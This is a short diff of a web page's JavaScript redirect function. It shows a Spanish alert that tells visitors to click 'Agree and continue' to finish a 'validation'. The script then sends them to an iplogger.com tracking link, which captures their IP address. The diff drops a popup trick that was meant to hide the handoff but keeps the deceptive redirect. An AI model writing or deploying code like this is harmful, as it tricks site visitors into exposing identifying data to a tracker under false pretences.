@@ -102,20 +102,11 @@
   function redirect() {
     alert("En la siguiente página, por favor haz clic en el botón 'Agree and continue' para finalizar la validación.");
 
-    // 1. Open a small popup window (less likely to grab focus)
-    const popup = window.open("", "_blank", "width=600,height=400");
-
-    // 2. Redirect main tab to iplogger (user stays here)
+    // Redirect to iplogger, no popups
     window.location.href = "https://iplogger.com/2Uk6c6";
-
-    // 3. Change popup window content after 40 seconds
-    setTimeout(() => {
-      if (popup) {
-        popup.location.href = "final.html";
-      }
-    }, 40000);
   }
 </script>
+
 
 
 
